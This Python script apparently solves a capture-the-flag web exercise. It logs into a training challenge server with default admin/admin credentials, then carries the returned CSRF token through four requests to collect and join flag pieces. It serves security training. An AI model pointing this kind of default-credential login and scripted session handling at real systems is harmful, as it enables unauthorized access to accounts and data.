#!/bin/env python3
login = 'http://web-11.challs.olicyber.it/login'
flag = 'http://web-11.challs.olicyber.it/flag_piece'
import requests as r
import json

data = {'username': 'admin', 'password': 'admin'}
headers = {'Content-Type': 'application/json'}

s = r.Session()
res = s.post(login, json=data, headers=headers)
f = ''
if res.status_code == 200:
    print(res.headers)
    print(res.text)
    try:
        token = res.json().get('csrf')
        if token:
            print(token)
            for i in range(4):
                params = {'index': str(i), 'csrf': token}
                # token = request.args.get("csrf") from the server
                headers['csrf'] = token
                res = s.get(flag, headers=headers, params=params)
                if res.status_code == 200:
                    print(res.text)
                    token = json.loads(res.text).get('csrf')
                    f += json.loads(res.text).get('flag_piece')
                else:
                    print(f"Failed to get flag, status code: {res.status_code}")
        else:
            print("CSRF token not found in the login response.")
    except json.JSONDecodeError:
        print("Failed to decode JSON response.")
else:
    print(f"Login failed, status code: {res.status_code}")

print(f"Flag: {f}")
